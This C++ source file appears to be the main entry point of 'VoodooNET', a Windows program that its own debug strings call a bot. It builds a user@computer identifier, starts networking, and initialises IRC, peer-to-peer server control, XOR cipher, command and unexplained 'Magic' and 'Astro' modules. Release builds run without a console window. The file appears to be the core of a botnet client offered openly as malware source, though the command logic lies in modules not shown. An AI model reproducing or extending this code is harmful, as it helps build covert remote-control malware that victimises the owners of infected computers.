/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"

char strBuf[64];
cVoodoo* g_cVoodoo = new cVoodoo;


char* GetPCInfo()
{
	
	char* buf = nullptr;
	size_t sz = 0;
	char* bufpc = nullptr;
	size_t szpc = 0;

	if (_dupenv_s(&buf, &sz, "USERNAME") == 0 && buf != nullptr)
	{
		if (_dupenv_s(&bufpc, &szpc, "COMPUTERNAME") == 0 && bufpc != nullptr)
		{
			sprintf_s(strBuf, sizeof(strBuf), "%s@%s", buf, bufpc);
		}
	}
	return strBuf;
	

//	return 0;
}

cVoodoo::cVoodoo()
{
	m_bRunning = true;
}

cVoodoo::~cVoodoo()
{
	g_cVoodoo->m_cLogging.Print("Destrurctor", "Exit!");
}
#ifdef _DEBUG
int main(int argc, int argv, ...) {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
#endif
	bool conn = false;
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cVoodooBot", "[Starting bot..]");
#endif
	
	//Loading Base Modules
	// cVoodoo

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		printf("Unable to initialize Winsock.\r\n");

	}



	// Initializing Modules
	g_cVoodoo->m_cCommands.Init();
	g_cVoodoo->m_cXORCipher.Init();
	g_cVoodoo->m_cLogging.Init();
	g_cVoodoo->m_cString.Init();
	g_cVoodoo->m_cThread.Init();
	g_cVoodoo->m_cSystem.Init();
	g_cVoodoo->m_cSocket.Init();

	// modules
#ifndef NO_P2P
	g_cVoodoo->m_cServerControl.Init();
#endif
	g_cVoodoo->m_cMagic.Init();
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.Init();
#endif
#ifndef NO_ASTRO

	g_cVoodoo->m_cAstro.Init();
#endif
//	g_cVoodoo->m_cServerControl.StartDaemon();
	g_cVoodoo->m_cCommands.ShowModules();
//	g_cVoodoo->m_cServer.Init();
	while (1)
	{
		if (!g_cVoodoo->m_bRunning)
			return 0;
		Sleep(5000);
	}
	return 0;
}

